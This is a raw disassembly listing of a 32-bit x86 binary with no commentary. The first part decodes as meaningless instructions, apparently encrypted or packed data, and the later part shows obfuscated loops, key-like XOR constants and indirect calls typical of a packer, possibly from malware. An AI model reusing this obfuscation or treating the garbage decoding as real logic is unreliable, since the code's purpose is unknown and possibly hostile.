  416a1c:	and    DWORD PTR [ecx+0x51287f8c],esp
  416a22:	fs jge 0x4169a9
  416a25:	inc    ebx
  416a26:	mov    al,ds:0x545f67c5
  416a2b:	mov    ecx,0xa2ac8baa
  416a30:	pop    es
  416a31:	inc    ebp
  416a32:	in     eax,dx
  416a33:	mov    edi,0xf3dcac15
  416a38:	ins    BYTE PTR es:[edi],dx
  416a39:	clc    
  416a3a:	adc    DWORD PTR [ebp+edx*4-0x3692e092],edx
  416a41:	pop    DWORD PTR [ecx+0x3d493e2b]
  416a47:	repz idiv BYTE PTR [ebx+0x3a89a046]
  416a4e:	cmp    DWORD PTR [edx+0x2f71de6a],eax
  416a54:	push   ebx
  416a55:	jmp    0x63f37062
  416a5a:	adc    DWORD PTR [eax],esi
  416a5c:	lods   eax,DWORD PTR ds:[esi]
  416a5d:	mov    BYTE PTR [esi+0x76],0x3f
  416a61:	adc    eax,0xc919a53f
  416a66:	daa    
  416a67:	jle    0x416a01
  416a69:	cwde   
  416a6a:	jmp    0x26c0931e
  416a6f:	test   esp,edx
  416a71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a72:	sbb    DWORD PTR [edx+0x5fcb0c18],0xb57d877e
  416a7c:	pop    ds
  416a7d:	or     ebp,DWORD PTR [ebp-0x50]
  416a80:	inc    ecx
  416a81:	cmc    
  416a82:	lods   al,BYTE PTR ds:[esi]
  416a83:	mov    dl,0xf0
  416a85:	mov    BYTE PTR [edi-0x5e7030ba],al
  416a8b:	cli    
  416a8c:	call   0xf56faf67
  416a91:	add    DWORD PTR [ebx],0xbc2a31c4
  416a97:	leave  
  416a98:	faddp  st(4),st
  416a9a:	mov    ecx,0x9e4bc50f
  416a9f:	jmp    ebx
  416aa1:	inc    ecx
  416aa2:	rcl    DWORD PTR [eax+0x7d],1
  416aa5:	mov    eax,ds:0x5bd8ccc6
  416aaa:	aas    
  416aab:	xchg   ebp,eax
  416aac:	idiv   BYTE PTR [eax+0x4761be72]
  416ab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ab3:	dec    edi
  416ab4:	xor    eax,0xa8502d4d
  416ab9:	xor    DWORD PTR [edx],eax
  416abb:	push   0xfeeae580
  416ac0:	push   0x9f795a91
  416ac5:	jecxz  0x416a84
  416ac7:	and    BYTE PTR ds:0xc573cb07,0xeb
  416ace:	sub    DWORD PTR ds:0x1909c6ac,ecx
  416ad4:	lahf   
  416ad5:	cmp    eax,DWORD PTR [edx+0x865ad16]
  416adb:	add    edx,DWORD PTR [esi+0x58f3de8]
  416ae1:	inc    edx
  416ae2:	pusha  
  416ae3:	sbb    esp,esp
  416ae5:	aas    
  416ae6:	shl    DWORD PTR ds:0xddee33c0,cl
  416aec:	sbb    esi,DWORD PTR [esi+0x22f61f9f]
  416af2:	push   eax
  416af3:	es push 0x9
  416af6:	mov    ebp,0xc61fe9cb
  416afb:	cmc    
  416afc:	repz mov ds:0xbce11c16,eax
  416b02:	inc    esp
  416b03:	sub    ch,ah
  416b05:	icebp  
  416b06:	adc    esi,DWORD PTR ds:[edx-0x7d]
  416b0a:	loop   0x416acf
  416b0c:	fdivr  DWORD PTR [esi+0x44]
  416b0f:	retf   
  416b10:	add    cl,BYTE PTR [edx+ecx*1]
  416b13:	cli    
  416b14:	shrd   DWORD PTR [ecx-0x5074f6b5],ecx,cl
  416b1b:	and    edi,DWORD PTR ds:0x27908059
  416b21:	into   
  416b22:	js     0x416b6b
  416b24:	adc    esi,DWORD PTR [ecx+0xa]
  416b27:	cmp    cl,BYTE PTR [eax+ebx*1+0x2f]
  416b2b:	jecxz  0x416b81
  416b2d:	mov    edi,0xcda57f17
  416b32:	sbb    al,ah
  416b34:	mov    esi,?
  416b36:	gs cmp al,0x3f
  416b39:	leave  
  416b3a:	enter  0x9896,0xd1
  416b3e:	lds    ebp,FWORD PTR [eax+0x376d39a]
  416b44:	or     esp,edi
  416b46:	mov    fs,WORD PTR [ecx]
  416b48:	cwde   
  416b49:	mov    dl,0x3e
  416b4b:	mov    ds:0xa9194dbc,al
  416b50:	in     al,dx
  416b51:	in     al,0x75
  416b53:	(bad)  
  416b54:	fidiv  WORD PTR [edi+0x289701f1]
  416b5a:	pop    esi
  416b5b:	test   eax,0x7802b5eb
  416b60:	fmul   DWORD PTR [esi+0x4b]
  416b63:	lock jno 0x416bc5
  416b66:	mov    dl,BYTE PTR [edi+0x3fce8f2d]
  416b6c:	xchg   edi,eax
  416b6d:	inc    edx
  416b6e:	js     0x416bc4
  416b70:	out    0x8b,al
  416b72:	xchg   ebx,eax
  416b73:	sar    DWORD PTR [ecx],cl
  416b75:	mov    ah,0x16
  416b77:	mov    al,0xfd
  416b79:	pushf  
  416b7a:	test   al,ah
  416b7c:	jno    0x416b0a
  416b7e:	sub    bl,BYTE PTR [ebx-0x54cec8c4]
  416b84:	ins    BYTE PTR es:[edi],dx
  416b85:	mov    ecx,0xddec2c28
  416b8a:	fild   QWORD PTR [edx-0x7692e3b5]
  416b90:	repz xor eax,0x4b44eb1e
  416b96:	push   0x2d
  416b98:	sub    ch,BYTE PTR [edi-0x6ed6e888]
  416b9e:	jge    0x416bbe
  416ba0:	(bad)  
  416ba2:	inc    esp
  416ba3:	lods   eax,DWORD PTR ds:[esi]
  416ba4:	xor    dl,cl
  416ba6:	ja     0x416b84
  416ba8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ba9:	dec    eax
  416baa:	pop    esp
  416bab:	hlt    
  416bac:	test   DWORD PTR [eax],0xba6c7621
  416bb2:	xchg   edi,eax
  416bb3:	mov    ch,0xf4
  416bb5:	mov    ds:0xb7a7642a,al
  416bba:	jle    0x416bd8
  416bbc:	pop    es
  416bbd:	mov    al,0xe4
  416bbf:	dec    ecx
  416bc0:	xchg   ebx,edi
  416bc2:	ja     0x416b75
  416bc4:	test   al,0x61
  416bc6:	inc    eax
  416bc7:	pushf  
  416bc8:	and    al,0x77
  416bca:	retf   0x2e83
  416bcd:	jnp    0x416bd4
  416bcf:	retf   0x3e0b
  416bd2:	shr    BYTE PTR [esi],1
  416bd4:	xor    eax,0x830b4ad8
  416bd9:	clc    
  416bda:	arpl   WORD PTR [ebp+0x60],cx
  416bdd:	xor    BYTE PTR [edi-0x5c65ac97],0xd1
  416be4:	ins    BYTE PTR es:[edi],dx
  416be5:	pop    ds
  416be6:	sub    eax,0x93660d9c
  416beb:	fbstp  TBYTE PTR [ebx]
  416bed:	dec    ebp
  416bee:	sub    esp,ebp
  416bf0:	adc    eax,0x8fdf3861
  416bf5:	jge    0x416bcb
  416bf7:	cmp    eax,0x37a64a41
  416bfc:	and    BYTE PTR [ecx-0x3f76b30a],cl
  416c02:	mov    eax,0xca0d1a25
  416c07:	sub    DWORD PTR [edi+0x8],esi
  416c0a:	add    DWORD PTR [eax],ebp
  416c0c:	push   ss
  416c0d:	push   ebp
  416c0e:	test   ebp,0xee487fc6
  416c14:	mov    edi,0xa73233d3
  416c19:	ins    BYTE PTR es:[edi],dx
  416c1a:	inc    edi
  416c1b:	neg    BYTE PTR [esi+0x74a8172]
  416c21:	addr16 gs (bad) 
  416c24:	leave  
  416c25:	call   0x3eee:0xe4a9f6b9
  416c2c:	stc    
  416c2d:	add    eax,0xab351b7c
  416c32:	inc    ecx
  416c33:	hlt    
  416c34:	lods   al,BYTE PTR ds:[esi]
  416c35:	ret    0xcf2c
  416c38:	jbe    0x416bdc
  416c3a:	or     DWORD PTR [ecx],esi
  416c3c:	and    BYTE PTR [ebx],ch
  416c3e:	inc    ecx
  416c3f:	push   esi
  416c40:	ror    edx,0xf2
  416c43:	push   ds
  416c44:	fisttp DWORD PTR [eax+0x47]
  416c47:	fistp  WORD PTR [edx]
  416c49:	add    eax,0x710f1799
  416c4e:	push   cs
  416c4f:	fisub  WORD PTR [eax]
  416c51:	cld    
  416c52:	cmc    
  416c53:	or     ah,BYTE PTR cs:[esi-0x3c9a62b1]
  416c5a:	mov    cl,0x58
  416c5c:	fnop   
  416c5e:	sbb    edi,DWORD PTR [eax]
  416c60:	(bad)  
  416c61:	sbb    BYTE PTR [ebx+0x25],bh
  416c64:	and    eax,0x9db4b3ff
  416c69:	out    0xbc,al
  416c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c6c:	push   0xffffff86
  416c6e:	xchg   ebx,eax
  416c6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c70:	shl    BYTE PTR [ecx-0x7bcc2a85],0x52
  416c77:	(bad)  
  416c78:	cmc    
  416c79:	test   cl,0xd6
  416c7c:	mov    al,ds:0xae69037b
  416c81:	test   eax,0x3ef6698a
  416c86:	jle    0x416cdf
  416c88:	imul   edx,eax,0xbcf0e8a2
  416c8e:	add    eax,0xc2135d1
  416c93:	and    BYTE PTR [esi],dh
  416c95:	lods   eax,DWORD PTR ds:[esi]
  416c96:	fsub   QWORD PTR [ecx+0x55]
  416c99:	sub    eax,0x84302ecd
  416c9e:	pop    esi
  416c9f:	in     eax,dx
  416ca0:	sete   BYTE PTR [ebp-0x5d5104ab]
  416ca7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ca8:	add    ecx,DWORD PTR [ebp-0x4f1b985f]
  416cae:	in     al,dx
  416caf:	push   0x53
  416cb1:	add    bl,BYTE PTR [ebx+edi*8+0x7cbb4577]
  416cb8:	push   0x4256e9a3
  416cbd:	pop    es
  416cbe:	cmp    ebx,DWORD PTR [esi-0xe]
  416cc1:	jmp    0xcb7e:0x515e75bc
  416cc8:	(bad)  
  416cca:	mov    bh,0x7
  416ccc:	in     al,dx
  416ccd:	ins    BYTE PTR es:[edi],dx
  416cce:	leave  
  416ccf:	mov    DWORD PTR [esi+0x33f85d8b],ebp
  416cd5:	shl    BYTE PTR [ebx],1
  416cd7:	fsubr  DWORD PTR [ebx]
  416cd9:	shr    DWORD PTR [ebx],cl
  416cdb:	(bad)  
  416cdc:	xor    edx,eax
  416cde:	mov    DWORD PTR [ebp+0x8],edx
  416ce1:	mov    edx,DWORD PTR [ebp+0x8]
  416ce4:	mov    ebx,DWORD PTR [ebp-0x58]
  416ce7:	lea    edx,[ebx+edx*1+0x5708f4]
  416cee:	mov    DWORD PTR [ebp-0x58],edx
  416cf1:	mov    edx,DWORD PTR [ebp+0x8]
  416cf4:	mov    ebx,DWORD PTR [ebp-0x54]
  416cf7:	add    edx,0x64f89a
  416cfd:	imul   edx,ebx
  416d00:	mov    DWORD PTR [ebp-0x54],edx
  416d03:	mov    edx,DWORD PTR [ebp+0x8]
  416d06:	mov    ebx,DWORD PTR [ebp-0x50]
  416d09:	add    edx,0x242ebe9
  416d0f:	and    edx,ebx
  416d11:	mov    DWORD PTR [ebp-0x50],edx
  416d14:	mov    edx,DWORD PTR [ebp+0x8]
  416d17:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d1a:	add    edx,ecx
  416d1c:	or     edx,ebx
  416d1e:	mov    DWORD PTR [ebp-0x4c],edx
  416d21:	mov    edx,DWORD PTR [ebp+0x8]
  416d24:	mov    ebx,0xfdbe0321
  416d29:	sub    ebx,edx
  416d2b:	add    ebx,DWORD PTR [ebp-0x48]
  416d2e:	mov    DWORD PTR [ebp-0x48],ebx
  416d31:	mov    edx,DWORD PTR [ebp+0x8]
  416d34:	mov    ebx,DWORD PTR [ebp-0x44]
  416d37:	add    edx,edi
  416d39:	xor    edx,ebx
  416d3b:	mov    DWORD PTR [ebp-0x44],edx
  416d3e:	mov    edx,DWORD PTR [ebp+0x8]
  416d41:	xor    edx,eax
  416d43:	add    edx,esi
  416d45:	jne    0x41497b
  416d4b:	jmp    0x416dd8
  416d50:	mov    edx,DWORD PTR [ebp-0x14]
  416d53:	mov    DWORD PTR [ebp+0x8],edx
  416d56:	jmp    0x416dcb
  416d5b:	mov    edx,DWORD PTR [ebp+0x8]
  416d5e:	mov    ebx,DWORD PTR [ebp-0x8]
  416d61:	xor    edx,eax
  416d63:	xor    ebx,eax
  416d65:	sub    edx,ebx
  416d67:	sub    edx,esi
  416d69:	xor    edx,eax
  416d6b:	mov    DWORD PTR [ebp+0x8],edx
  416d6e:	mov    edx,DWORD PTR [ebp+0x8]
  416d71:	mov    ebx,DWORD PTR [ebp-0x58]
  416d74:	lea    edx,[ebx+edx*1+0x5708f4]
  416d7b:	mov    DWORD PTR [ebp-0x58],edx
  416d7e:	mov    edx,DWORD PTR [ebp+0x8]
  416d81:	mov    ebx,DWORD PTR [ebp-0x54]
  416d84:	add    edx,0x64f89a
  416d8a:	imul   edx,ebx
  416d8d:	mov    DWORD PTR [ebp-0x54],edx
  416d90:	mov    edx,DWORD PTR [ebp+0x8]
  416d93:	mov    ebx,DWORD PTR [ebp-0x50]
  416d96:	add    edx,0x242ebe9
  416d9c:	and    edx,ebx
  416d9e:	mov    DWORD PTR [ebp-0x50],edx
  416da1:	mov    edx,DWORD PTR [ebp+0x8]
  416da4:	mov    ebx,DWORD PTR [ebp-0x4c]
  416da7:	add    edx,ecx
  416da9:	or     edx,ebx
  416dab:	mov    DWORD PTR [ebp-0x4c],edx
  416dae:	mov    edx,DWORD PTR [ebp+0x8]
  416db1:	mov    ebx,0xfdbe0321
  416db6:	sub    ebx,edx
  416db8:	add    ebx,DWORD PTR [ebp-0x48]
  416dbb:	mov    DWORD PTR [ebp-0x48],ebx
  416dbe:	mov    edx,DWORD PTR [ebp+0x8]
  416dc1:	mov    ebx,DWORD PTR [ebp-0x44]
  416dc4:	add    edx,edi
  416dc6:	xor    edx,ebx
  416dc8:	mov    DWORD PTR [ebp-0x44],edx
  416dcb:	mov    edx,DWORD PTR [ebp+0x8]
  416dce:	xor    edx,eax
  416dd0:	add    edx,esi
  416dd2:	jne    0x416d5b
  416dd8:	mov    edx,DWORD PTR [ebp-0x14]
  416ddb:	mov    DWORD PTR [ebp+0x8],edx
  416dde:	jmp    0x416e53
  416de3:	mov    edx,DWORD PTR [ebp+0x8]
  416de6:	mov    ebx,DWORD PTR [ebp-0x8]
  416de9:	xor    edx,eax
  416deb:	xor    ebx,eax
  416ded:	sub    edx,ebx
  416def:	sub    edx,esi
  416df1:	xor    edx,eax
  416df3:	mov    DWORD PTR [ebp+0x8],edx
  416df6:	mov    edx,DWORD PTR [ebp+0x8]
  416df9:	mov    ebx,DWORD PTR [ebp-0x58]
  416dfc:	lea    edx,[ebx+edx*1+0x5708f4]
  416e03:	mov    DWORD PTR [ebp-0x58],edx
  416e06:	mov    edx,DWORD PTR [ebp+0x8]
  416e09:	mov    ebx,DWORD PTR [ebp-0x54]
  416e0c:	add    edx,0x64f89a
  416e12:	imul   edx,ebx
  416e15:	mov    DWORD PTR [ebp-0x54],edx
  416e18:	mov    edx,DWORD PTR [ebp+0x8]
  416e1b:	mov    ebx,DWORD PTR [ebp-0x50]
  416e1e:	add    edx,0x242ebe9
  416e24:	and    edx,ebx
  416e26:	mov    DWORD PTR [ebp-0x50],edx
  416e29:	mov    edx,DWORD PTR [ebp+0x8]
  416e2c:	mov    ebx,DWORD PTR [ebp-0x4c]
  416e2f:	add    edx,ecx
  416e31:	or     edx,ebx
  416e33:	mov    DWORD PTR [ebp-0x4c],edx
  416e36:	mov    edx,DWORD PTR [ebp+0x8]
  416e39:	mov    ebx,0xfdbe0321
  416e3e:	sub    ebx,edx
  416e40:	add    ebx,DWORD PTR [ebp-0x48]
  416e43:	mov    DWORD PTR [ebp-0x48],ebx
  416e46:	mov    edx,DWORD PTR [ebp+0x8]
  416e49:	mov    ebx,DWORD PTR [ebp-0x44]
  416e4c:	add    edx,edi
  416e4e:	xor    edx,ebx
  416e50:	mov    DWORD PTR [ebp-0x44],edx
  416e53:	mov    edx,DWORD PTR [ebp+0x8]
  416e56:	xor    edx,eax
  416e58:	add    edx,esi
  416e5a:	jne    0x416de3
  416e60:	mov    edx,DWORD PTR [ebp-0x8]
  416e63:	mov    ebx,DWORD PTR [ebp-0xc]
  416e66:	xor    edx,eax
  416e68:	lea    edx,[edx+ebx*1+0x3272fa]
  416e6f:	mov    DWORD PTR [ebp-0xc],edx
  416e72:	mov    edx,DWORD PTR [ebp-0x10]
  416e75:	xor    edx,eax
  416e77:	add    edx,esi
  416e79:	jne    0x412518
  416e7f:	jmp    0x416f96
  416e84:	mov    ecx,DWORD PTR [ebp-0x14]
  416e87:	mov    DWORD PTR [ebp+0x8],ecx
  416e8a:	jmp    0x416f03
  416e8f:	mov    ecx,DWORD PTR [ebp+0x8]
  416e92:	mov    edx,DWORD PTR [ebp-0x8]
  416e95:	xor    ecx,eax
  416e97:	xor    edx,eax
  416e99:	sub    ecx,edx
  416e9b:	sub    ecx,esi
  416e9d:	xor    ecx,eax
  416e9f:	mov    DWORD PTR [ebp+0x8],ecx
  416ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  416ea5:	mov    edx,DWORD PTR [ebp-0x58]
  416ea8:	lea    ecx,[edx+ecx*1+0x5708f4]
  416eaf:	mov    DWORD PTR [ebp-0x58],ecx
  416eb2:	mov    ecx,DWORD PTR [ebp+0x8]
  416eb5:	mov    edx,DWORD PTR [ebp-0x54]
  416eb8:	add    ecx,0x64f89a
  416ebe:	imul   ecx,edx
  416ec1:	mov    DWORD PTR [ebp-0x54],ecx
  416ec4:	mov    ecx,DWORD PTR [ebp+0x8]
  416ec7:	mov    edx,DWORD PTR [ebp-0x50]
  416eca:	add    ecx,0x242ebe9
  416ed0:	and    ecx,edx
  416ed2:	mov    DWORD PTR [ebp-0x50],ecx
  416ed5:	mov    ecx,DWORD PTR [ebp+0x8]
  416ed8:	mov    edx,DWORD PTR [ebp-0x4c]
  416edb:	add    ecx,0xf641bea
  416ee1:	or     ecx,edx
  416ee3:	mov    DWORD PTR [ebp-0x4c],ecx
  416ee6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ee9:	mov    edx,0xfdbe0321
  416eee:	sub    edx,ecx
  416ef0:	add    edx,DWORD PTR [ebp-0x48]
  416ef3:	mov    DWORD PTR [ebp-0x48],edx
  416ef6:	mov    ecx,DWORD PTR [ebp+0x8]
  416ef9:	mov    edx,DWORD PTR [ebp-0x44]
  416efc:	add    ecx,edi
  416efe:	xor    ecx,edx
  416f00:	mov    DWORD PTR [ebp-0x44],ecx
  416f03:	mov    ecx,DWORD PTR [ebp+0x8]
  416f06:	xor    ecx,eax
  416f08:	add    ecx,esi
  416f0a:	jne    0x416e8f
  416f10:	jmp    0x416fa2
  416f15:	mov    ecx,DWORD PTR [ebp+0x8]
  416f18:	mov    edx,DWORD PTR [ebp-0x8]
  416f1b:	xor    ecx,eax
  416f1d:	xor    edx,eax
  416f1f:	sub    ecx,edx
  416f21:	sub    ecx,esi
  416f23:	xor    ecx,eax
  416f25:	mov    DWORD PTR [ebp+0x8],ecx
  416f28:	mov    ecx,DWORD PTR [ebp+0x8]
  416f2b:	mov    edx,DWORD PTR [ebp-0x58]
  416f2e:	lea    ecx,[edx+ecx*1+0x5708f4]
  416f35:	mov    DWORD PTR [ebp-0x58],ecx
  416f38:	mov    ecx,DWORD PTR [ebp+0x8]
  416f3b:	mov    edx,DWORD PTR [ebp-0x54]
  416f3e:	add    ecx,0x64f89a
  416f44:	imul   ecx,edx
  416f47:	mov    DWORD PTR [ebp-0x54],ecx
  416f4a:	mov    ecx,DWORD PTR [ebp+0x8]
  416f4d:	mov    edx,DWORD PTR [ebp-0x50]
  416f50:	add    ecx,0x242ebe9
  416f56:	and    ecx,edx
  416f58:	mov    DWORD PTR [ebp-0x50],ecx
  416f5b:	mov    ecx,DWORD PTR [ebp+0x8]
  416f5e:	mov    edx,DWORD PTR [ebp-0x4c]
  416f61:	add    ecx,0xf641bea
  416f67:	or     ecx,edx
  416f69:	mov    DWORD PTR [ebp-0x4c],ecx
  416f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f6f:	mov    edx,0xfdbe0321
  416f74:	sub    edx,ecx
  416f76:	add    edx,DWORD PTR [ebp-0x48]
  416f79:	mov    DWORD PTR [ebp-0x48],edx
  416f7c:	mov    ecx,DWORD PTR [ebp+0x8]
  416f7f:	mov    edx,DWORD PTR [ebp-0x44]
  416f82:	add    ecx,edi
  416f84:	xor    ecx,edx
  416f86:	mov    DWORD PTR [ebp-0x44],ecx
  416f89:	mov    ecx,DWORD PTR [ebp+0x8]
  416f8c:	xor    ecx,eax
  416f8e:	add    ecx,esi
  416f90:	jne    0x416f15
  416f96:	mov    ecx,DWORD PTR [ebp-0x8]
  416f99:	xor    ecx,eax
  416f9b:	mov    eax,DWORD PTR [ebp+0x10]
  416f9e:	add    ecx,esi
  416fa0:	mov    DWORD PTR [eax],ecx
  416fa2:	pop    edi
  416fa3:	pop    esi
  416fa4:	pop    ebx
  416fa5:	leave  
  416fa6:	ret    0xc
  416fa9:	push   ebp
  416faa:	mov    ebp,esp
  416fac:	sub    esp,0x78
  416faf:	add    DWORD PTR ds:0x426f25,0x66eb
  416fb9:	push   esi
  416fba:	mov    esi,DWORD PTR ds:0x426f55
  416fc0:	mov    eax,ds:0x428cf1
  416fc5:	sub    eax,esi
  416fc7:	imul   esi,DWORD PTR [esi+eax*1]
  416fcb:	push   edi
  416fcc:	xor    esi,esi
  416fce:	or     esi,DWORD PTR ds:0x42af55
  416fd4:	mov    esi,DWORD PTR [esi]
  416fd6:	sbb    DWORD PTR ds:0x426e8d,esi
  416fdc:	mov    eax,ds:0x4262c9
  416fe1:	mov    DWORD PTR [ebp-0x24],eax
  416fe4:	and    DWORD PTR ds:0x426eb9,0x0
  416fee:	mov    esi,DWORD PTR ds:0x426eb9
  416ff4:	inc    esi
  416ff5:	mov    DWORD PTR ds:0x426eb9,esi
  416ffb:	cmp    DWORD PTR ds:0x426eb9,0x4
  417002:	jbe    0x41703f
  417008:	jmp    0x417018
  41700d:	push   0x2f87
  417012:	call   DWORD PTR ds:0x430a2c
  417018:	cmp    DWORD PTR ds:0x426eb9,0x3
  41701f:	jne    0x417032
  417025:	mov    esi,DWORD PTR ds:0x426eb9
  41702b:	inc    esi
  41702c:	mov    DWORD PTR ds:0x426eb9,esi
  417032:	cmp    DWORD PTR ds:0x426eb9,0x19
  417039:	jb     0x416fee
  41703f:	mov    eax,ds:0x4263e9
  417044:	mov    DWORD PTR [ebp-0x30],eax
  417047:	sub    esi,esi
  417049:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  417050:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  417057:	and    DWORD PTR ds:0x426ec1,0x0
  417061:	jmp    0x417074
  417066:	xor    eax,eax
  417068:	add    eax,DWORD PTR ds:0x426ec1
  41706e:	inc    eax
  41706f:	mov    ds:0x426ec1,eax
  417074:	cmp    DWORD PTR ds:0x426ec1,0x13
  41707b:	jae    0x4170b9
  417081:	cmp    DWORD PTR ds:0x426ec1,0x5
  417088:	jg     0x4170b9
  41708e:	jmp    0x417099
  417093:	call   DWORD PTR ds:0x430a00
  417099:	cmp    DWORD PTR ds:0x426ec1,0x4
  4170a0:	jne    0x4170b4
  4170a6:	xor    eax,eax
  4170a8:	xor    eax,DWORD PTR ds:0x426ec1
  4170ae:	inc    eax
  4170af:	mov    ds:0x426ec1,eax
  4170b4:	jmp    0x417066
  4170b9:	mov    eax,DWORD PTR [ebp-0x10]
  4170bc:	mov    ecx,DWORD PTR [ebp-0x10]
  4170bf:	sub    eax,ecx
  4170c1:	mov    ecx,DWORD PTR ds:0x428cfd
  4170c7:	mov    ecx,DWORD PTR [ecx]
  4170c9:	and    DWORD PTR ds:0x426ed5,ecx
  4170cf:	mov    DWORD PTR [ebp-0x10],eax
  4170d2:	and    DWORD PTR ds:0x426ec1,0x0
  4170dc:	xor    ecx,ecx
  4170de:	or     ecx,DWORD PTR ds:0x426ec1
  4170e4:	inc    ecx
  4170e5:	mov    DWORD PTR ds:0x426ec1,ecx
  4170eb:	cmp    DWORD PTR ds:0x426ec1,0x8
  4170f2:	ja     0x417153
  4170f8:	jmp    0x41712c
  4170fd:	push   0x4411
  417102:	push   DWORD PTR [ebp-0x28]
  417105:	push   0x7cba
  41710a:	push   0x1619
  41710f:	push   DWORD PTR [ebp-0x28]
  417112:	push   0x5e18
  417117:	push   0x6c27
  41711c:	push   0x15fe
  417121:	push   0x4181
  417126:	call   DWORD PTR ds:0x430a04
  41712c:	cmp    DWORD PTR ds:0x426ec1,0x7
  417133:	jne    0x417146
  417139:	mov    ecx,DWORD PTR ds:0x426ec1
  41713f:	inc    ecx
  417140:	mov    DWORD PTR ds:0x426ec1,ecx
  417146:	cmp    DWORD PTR ds:0x426ec1,0x1b
  41714d:	jb     0x4170dc
  417153:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  41715a:	mov    edi,DWORD PTR ds:0x426e95
  417160:	xor    DWORD PTR ds:0x426e91,edi
  417166:	mov    eax,DWORD PTR [ebp-0x18]
  417169:	mov    DWORD PTR ds:0x426e89,0x1f
  417173:	cmp    DWORD PTR ds:0x426e89,0x0
  41717a:	je     0x4171aa
  417180:	cmp    DWORD PTR ds:0x426e89,0x28
  417187:	jg     0x4171aa
  41718d:	jmp    0x417198
  417192:	call   DWORD PTR ds:0x430a38
  417198:	mov    esi,DWORD PTR ds:0x426e89
  41719e:	dec    esi
  41719f:	mov    DWORD PTR ds:0x426e89,esi
  4171a5:	jmp    0x417173
  4171aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4171ad:	sbb    DWORD PTR ds:0x426e91,ebx
  4171b3:	sub    eax,ecx
  4171b5:	mov    DWORD PTR [ebp-0x18],eax
  4171b8:	sbb    ecx,DWORD PTR ds:0x426ed5
  4171be:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4171c5:	mov    eax,DWORD PTR [ebp-0xc]
  4171c8:	mov    ecx,DWORD PTR [ebp-0xc]
  4171cb:	adc    DWORD PTR ds:0x426eed,0xa48
  4171d5:	sub    eax,ecx
  4171d7:	mov    DWORD PTR [ebp-0xc],eax
  4171da:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  4171e1:	mov    DWORD PTR ds:0x426eb9,0x1e
  4171eb:	cmp    DWORD PTR ds:0x426eb9,0x0
  4171f2:	je     0x417222
  4171f8:	cmp    DWORD PTR ds:0x426eb9,0x24
  4171ff:	jb     0x417222
  417205:	jmp    0x417210
  41720a:	call   DWORD PTR ds:0x430a08
  417210:	mov    esi,DWORD PTR ds:0x426eb9
  417216:	dec    esi
  417217:	mov    DWORD PTR ds:0x426eb9,esi
  41721d:	jmp    0x4171eb
  417222:	mov    eax,DWORD PTR [ebp-0x1c]
  417225:	mov    ecx,DWORD PTR [ebp-0x1c]
  417228:	sub    eax,ecx
  41722a:	mov    DWORD PTR [ebp-0x1c],eax
  41722d:	or     DWORD PTR [ebp-0x1c],0xf89c8595
  417234:	mov    eax,DWORD PTR [ebp-0x20]
  417237:	mov    ecx,DWORD PTR [ebp-0x20]
  41723a:	sub    eax,ecx
  41723c:	mov    DWORD PTR [ebp-0x20],eax
  41723f:	mov    eax,DWORD PTR [ebp-0x2c]
  417242:	mov    ecx,DWORD PTR [ebp-0x20]
  417245:	mov    esi,0x75108b3
  41724a:	xor    eax,esi
  41724c:	mov    edi,0x3272fa
  417251:	add    eax,edi
  417253:	or     eax,ecx
  417255:	mov    DWORD PTR [ebp-0x20],eax
  417258:	mov    eax,DWORD PTR [ebp-0x4]
  41725b:	mov    ecx,DWORD PTR [ebp-0x4]
  41725e:	sub    eax,ecx
  417260:	mov    DWORD PTR [ebp-0x4],eax
  417263:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  41726a:	mov    eax,DWORD PTR [ebp-0xc]
  41726d:	xor    eax,esi
  41726f:	add    eax,edi
  417271:	push   eax
  417272:	mov    eax,DWORD PTR [ebp-0x10]
  417275:	xor    eax,esi
  417277:	add    eax,edi
  417279:	push   eax
  41727a:	mov    eax,DWORD PTR [ebp-0x4]
  41727d:	xor    eax,esi
  41727f:	add    eax,0x3272fe
  417284:	push   eax
  417285:	lea    eax,[ebp-0x78]
  417288:	push   eax
  417289:	push   DWORD PTR [ebp-0x2c]
  41728c:	push   DWORD PTR [ebp-0x28]
  41728f:	call   0x40d3b8
  417294:	test   eax,eax
  417296:	je     0x4172c4
  41729c:	lea    eax,[ebp-0x78]
  41729f:	push   eax
  4172a0:	mov    eax,DWORD PTR [ebp-0x28]
  4172a3:	xor    eax,esi
  4172a5:	add    eax,edi
  4172a7:	push   eax
  4172a8:	mov    eax,DWORD PTR [ebp-0x24]
  4172ab:	add    eax,0xaa
  4172b0:	push   eax
  4172b1:	mov    eax,DWORD PTR [ebp-0x24]
  4172b4:	mov    eax,DWORD PTR [eax+0x198]
  4172ba:	push   DWORD PTR [eax]
  4172bc:	call   0x408594
  4172c1:	mov    DWORD PTR [ebp-0x14],eax
  4172c4:	mov    ecx,DWORD PTR ds:0x4263c1
  4172ca:	lea    eax,[ebp+0x4]
  4172cd:	mov    DWORD PTR [ecx*4+0x4263b9],eax
  4172d4:	inc    DWORD PTR ds:0x4263c1
  4172da:	mov    eax,DWORD PTR [ebp-0x14]
  4172dd:	test   eax,eax
  4172df:	je     0x417351
  4172e5:	lea    eax,[ebp-0x8]
  4172e8:	mov    DWORD PTR [ebp-0x34],eax
  4172eb:	mov    eax,DWORD PTR [ebp-0x30]
  4172ee:	mov    DWORD PTR [ebp-0x8],eax
  4172f1:	mov    eax,DWORD PTR [ebp-0x8]
  4172f4:	mov    ecx,DWORD PTR [ebp-0x14]
  4172f7:	sub    eax,ecx
  4172f9:	mov    DWORD PTR [ebp-0x8],eax
  4172fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4172ff:	xor    ecx,esi
  417301:	mov    eax,0xffcd8d06
  417306:	sub    eax,ecx
  417308:	add    DWORD PTR [ebp-0x8],eax
